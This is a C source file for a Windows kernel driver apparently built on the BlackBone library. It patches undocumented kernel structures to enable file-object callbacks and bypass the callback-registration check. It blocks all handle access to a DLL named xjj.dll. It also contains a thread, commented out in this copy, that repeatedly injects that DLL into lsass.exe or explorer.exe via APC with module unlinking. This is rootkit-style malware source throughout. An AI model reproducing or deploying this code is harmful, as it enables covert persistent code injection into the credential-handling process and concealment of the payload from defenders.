#include "BlackBoneDrv.h"
#include "Remap.h"
#include "Loader.h"
#include "Utils.h"
#include <Ntstrsafe.h>

#define DELAY_ONE_MICROSECOND (-10)
#define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
#define TARGET_PNAME_1 "lsass.exe"
#define TARGET_PNAME_2 "explorer.exe"
#define TARGET_SYS L"C:\\Users\\Administrator\\Desktop\\BlackBoneDrv.sys"
#define TARGET_DLL_FOR_INJECT L"C:\\Users\\Administrator\\Desktop\\xjj.dll"
#define TARGET_DLL_FOR_HOOK L"xjj.dll"
#define INJECT_SPLIT (60)
#define INVALID_PID (-1)
KEVENT kEvent;
PVOID obHandle;
NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);

#include <ntddk.h>
#include <string.h>

typedef struct _CALLBACK_ENTRY {
	LIST_ENTRY CallbackList;
	OB_OPERATION  Operations;
	ULONG Active;
	PVOID Handle;
	POBJECT_TYPE ObjectType;
	POB_PRE_OPERATION_CALLBACK  PreOperation;
	POB_POST_OPERATION_CALLBACK PostOperation;
	ULONG unknown;
} CALLBACK_ENTRY, *PCALLBACK_ENTRY;

/*typedef struct _OB_HANDLE {
USHORT Version;
USHORT OperationRegistrationCount;
PVOID RegistrationContext;
UNICODE_STRING Altitude;
CALLBACK_ENTRY entries[1]; // array of OperationRegistrationCount entries
} OB_HANDLE, *POB_HANDLE;*/

//STRUCT FOR WIN7X64
typedef struct _LDR_DATA                         // 24 elements, 0xE0 bytes (sizeof)
{
	/*0x000*/     struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)
	/*0x010*/     struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)
	/*0x020*/     struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)
	/*0x030*/     VOID*        DllBase;
	/*0x038*/     VOID*        EntryPoint;
	/*0x040*/     ULONG32      SizeOfImage;
	/*0x044*/     UINT8        _PADDING0_[0x4];
	/*0x048*/     struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)
	/*0x058*/     struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)
	/*0x068*/     ULONG32      Flags;
	/*0x06C*/     UINT16       LoadCount;
	/*0x06E*/     UINT16       TlsIndex;
	union                                                    // 2 elements, 0x10 bytes (sizeof)
	{
		/*0x070*/         struct _LIST_ENTRY HashLinks;                        // 2 elements, 0x10 bytes (sizeof)
		struct                                               // 2 elements, 0x10 bytes (sizeof)
		{
			/*0x070*/             VOID*        SectionPointer;
			/*0x078*/             ULONG32      CheckSum;
			/*0x07C*/             UINT8        _PADDING1_[0x4];
		};
	};
	union                                                    // 2 elements, 0x8 bytes (sizeof)
	{
		/*0x080*/         ULONG32      TimeDateStamp;
		/*0x080*/         VOID*        LoadedImports;
	};
	/*0x088*/     struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	/*0x090*/     VOID*        PatchInformation;
	/*0x098*/     struct _LIST_ENTRY ForwarderLinks;                       // 2 elements, 0x10 bytes (sizeof)
	/*0x0A8*/     struct _LIST_ENTRY ServiceTagLinks;                      // 2 elements, 0x10 bytes (sizeof)
	/*0x0B8*/     struct _LIST_ENTRY StaticLinks;                          // 2 elements, 0x10 bytes (sizeof)
	/*0x0C8*/     VOID*        ContextInformation;
	/*0x0D0*/     UINT64       OriginalBase;
	/*0x0D8*/     union _LARGE_INTEGER LoadTime;                           // 4 elements, 0x8 bytes (sizeof)
}LDR_DATA, *PLDR_DATA;

typedef struct _OBJECT_TYPE_INITIALIZER                                                                                                                                         // 25 elements, 0x70 bytes (sizeof)
{
	/*0x000*/     UINT16       Length;
	union                                                                                                                                                                       // 2 elements, 0x1 bytes (sizeof)
	{
		/*0x002*/         UINT8        ObjectTypeFlags;
		struct                                                                                                                                                                  // 7 elements, 0x1 bytes (sizeof)
		{
			/*0x002*/             UINT8        CaseInsensitive : 1;                                                                                                                                   // 0 BitPosition
			/*0x002*/             UINT8        UnnamedObjectsOnly : 1;                                                                                                                                // 1 BitPosition
			/*0x002*/             UINT8        UseDefaultObject : 1;                                                                                                                                  // 2 BitPosition
			/*0x002*/             UINT8        SecurityRequired : 1;                                                                                                                                  // 3 BitPosition
			/*0x002*/             UINT8        MaintainHandleCount : 1;                                                                                                                               // 4 BitPosition
			/*0x002*/             UINT8        MaintainTypeList : 1;                                                                                                                                  // 5 BitPosition
			/*0x002*/             UINT8        SupportsObjectCallbacks : 1;                                                                                                                           // 6 BitPosition
		};
	};
	/*0x004*/     ULONG32      ObjectTypeCode;
	/*0x008*/     ULONG32      InvalidAttributes;
	/*0x00C*/     struct _GENERIC_MAPPING GenericMapping;                                                                                                                                     // 4 elements, 0x10 bytes (sizeof)
	/*0x01C*/     ULONG32      ValidAccessMask;
	/*0x020*/     ULONG32      RetainAccess;
	/*0x024*/     enum _POOL_TYPE PoolType;
	/*0x028*/     ULONG32      DefaultPagedPoolCharge;
	/*0x02C*/     ULONG32      DefaultNonPagedPoolCharge;
	/*0x030*/     PVOID DumpProcedure;
	/*0x038*/     PVOID OpenProcedure;
	/*0x040*/     PVOID CloseProcedure;
	/*0x048*/     PVOID DeleteProcedure;
	/*0x050*/     PVOID ParseProcedure;
	/*0x058*/     PVOID SecurityProcedure;
	/*0x060*/     PVOID QueryNameProcedure;
	/*0x068*/     PVOID OkayToCloseProcedure;
}OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _EX_PUSH_LOCK                 // 7 elements, 0x8 bytes (sizeof)
{
	union                                    // 3 elements, 0x8 bytes (sizeof)
	{
		struct                               // 5 elements, 0x8 bytes (sizeof)
		{
			/*0x000*/             UINT64       Locked : 1;         // 0 BitPosition
			/*0x000*/             UINT64       Waiting : 1;        // 1 BitPosition
			/*0x000*/             UINT64       Waking : 1;         // 2 BitPosition
			/*0x000*/             UINT64       MultipleShared : 1; // 3 BitPosition
			/*0x000*/             UINT64       Shared : 60;        // 4 BitPosition
		};
		/*0x000*/         UINT64       Value;
		/*0x000*/         VOID*        Ptr;
	};
}_EX_PUSH_LOCK;

typedef struct _MY_OBJECT_TYPE                   // 12 elements, 0xD0 bytes (sizeof)
{
	/*0x000*/     struct _LIST_ENTRY TypeList;              // 2 elements, 0x10 bytes (sizeof)
	/*0x010*/     struct _UNICODE_STRING Name;              // 3 elements, 0x10 bytes (sizeof)
	/*0x020*/     VOID*        DefaultObject;
	/*0x028*/     UINT8        Index;
	/*0x029*/     UINT8        _PADDING0_[0x3];
	/*0x02C*/     ULONG32      TotalNumberOfObjects;
	/*0x030*/     ULONG32      TotalNumberOfHandles;
	/*0x034*/     ULONG32      HighWaterNumberOfObjects;
	/*0x038*/     ULONG32      HighWaterNumberOfHandles;
	/*0x03C*/     UINT8        _PADDING1_[0x4];
	/*0x040*/     struct _OBJECT_TYPE_INITIALIZER TypeInfo; // 25 elements, 0x70 bytes (sizeof)
	/*0x0B0*/     struct _EX_PUSH_LOCK TypeLock;            // 7 elements, 0x8 bytes (sizeof)
	/*0x0B8*/     ULONG32      Key;
	/*0x0BC*/     UINT8        _PADDING2_[0x4];
	/*0x0C0*/     struct _LIST_ENTRY CallbackList;          // 2 elements, 0x10 bytes (sizeof)
}MY_OBJECT_TYPE, *PMY_OBJECT_TYPE;

PEPROCESS LookupProcess(HANDLE Pid) {
	PEPROCESS eprocess = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &eprocess))) {
		return eprocess;
	}
	else {
		return NULL;
	}
}
long GetPidByPName(char* PName) {
	long pid = INVALID_PID;
	ULONG i = 0;
	PEPROCESS eproc = NULL;
	for (i = 4; i < 1 << 18; i = i + 4) {
		eproc = LookupProcess((HANDLE)i);
		if (NULL != eproc) {
			ObDereferenceObject(eproc);
			/*
			*/
			if (!strcmp(PName, (char*)PsGetProcessImageFileName(eproc))) {
				pid = (long)((char*)PsGetProcessId(eproc) - (char*)0);
				break;
			}
		} // end of if( NULL != eproc )
	}
	return pid;
}
VOID MySleep(LONG msec)
{
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	KeDelayExecutionThread(KernelMode, 0, &my_interval);
}
VOID MyThreadFunc(IN PVOID context)
{
	(void*)context;
	NTSTATUS status = STATUS_SUCCESS;
	INJECT_DLL data = { IT_Thread };

	for (; ; ) {
		wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT );
		wcscpy_s(data.initArg, 512, L"");
		data.type = IT_Apc;
		data.pid = GetPidByPName(TARGET_PNAME_1);
		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
		DbgPrint("[+] data.pid %d\n", data.pid);
		data.initRVA = 0;
		data.wait = TRUE;
		data.unlink = TRUE;
		data.erasePE = FALSE;
		status = BBInjectDll(&data);
		DbgPrint("[+] retun of BBInjectDll %d", status);
		MySleep(INJECT_SPLIT * 1000);
	}

	/*
	MySleep(3000);
	KeSetEvent(&kEvent, 0, TRUE);
	PsTerminateSystemThread(STATUS_SUCCESS);
	*/
}

OB_PREOP_CALLBACK_STATUS preCall(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)
{
	UNICODE_STRING DosName;
	PFILE_OBJECT fileo = OperationInformation->Object;
	HANDLE CurrentProcessId = PsGetCurrentProcessId();
	UNREFERENCED_PARAMETER(RegistrationContext);
	if (OperationInformation->ObjectType != *IoFileObjectType)
		return OB_PREOP_SUCCESS;
	//过滤无效指针
	if (fileo->FileName.Buffer == NULL ||
		!MmIsAddressValid(fileo->FileName.Buffer) ||
		fileo->DeviceObject == NULL ||
		!MmIsAddressValid(fileo->DeviceObject))
		return OB_PREOP_SUCCESS;
	//过滤无效路径
	if (!_wcsicmp(fileo->FileName.Buffer, L"\\Endpoint") ||
		!_wcsicmp(fileo->FileName.Buffer, L"?") ||
		!_wcsicmp(fileo->FileName.Buffer, L"\\.\\.") ||
		!_wcsicmp(fileo->FileName.Buffer, L"\\"))
		return OB_PREOP_SUCCESS;
	//阻止访问readme.txt
	if (wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_DLL_FOR_HOOK))
	{
		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
		{
			OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0;
		}
		if (OperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
		{
			OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
		}
	}
	RtlVolumeDeviceToDosName(fileo->DeviceObject, &DosName);
	DbgPrint("[FILE_MONITOR_X64][PID]%ld [File]%wZ%wZ\n", (ULONG64)CurrentProcessId, &DosName, &fileo->FileName);
	return OB_PREOP_SUCCESS;
}

VOID EnableObType(POBJECT_TYPE ObjectType)
{
	PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;
	myobtype->TypeInfo.SupportsObjectCallbacks = 1;
}

VOID _hijack_Unload()
{
	ObUnRegisterCallbacks(obHandle);
}

VOID _hijack(PDRIVER_OBJECT DriverObject) {
	NTSTATUS status = STATUS_SUCCESS;
	(void*)status;

	// [+] ---------- file protection ----------
	/*
	*/
	OB_CALLBACK_REGISTRATION obReg;
	OB_OPERATION_REGISTRATION opReg;
	PLDR_DATA ldr;
	EnableObType(*IoFileObjectType);
	ldr = (PLDR_DATA)DriverObject->DriverSection;
	ldr->Flags |= 0x20;
	// init callbacks
	memset(&obReg, 0, sizeof(obReg));
	obReg.Version = ObGetFilterVersion();
	obReg.OperationRegistrationCount = 1;
	obReg.RegistrationContext = NULL;
	RtlInitUnicodeString(&obReg.Altitude, L"321000");
	obReg.OperationRegistration = &opReg;
	memset(&opReg, 0, sizeof(opReg));
	opReg.ObjectType = IoFileObjectType;
	opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall;
	status = ObRegisterCallbacks(&obReg, &obHandle);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[FILE_MONITOR_X64] ERROR: events sources not installed\n");
	}
	else
		DbgPrint("[FILE_MONITOR_X64] SUCCESS: callbacks registered\n");
	// [+] ---------- file protection ends ----------

	// [+] ---------- Thread Inject ----------
	/*
	HANDLE hThread;
	KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
	status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, MyThreadFunc,
		NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("PsCreateSystemThread failed!");
		return;
	}
	ZwClose(hThread);
	*/
	/*KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);*/
	// [+] ---------- Thread Inject ends ----------
}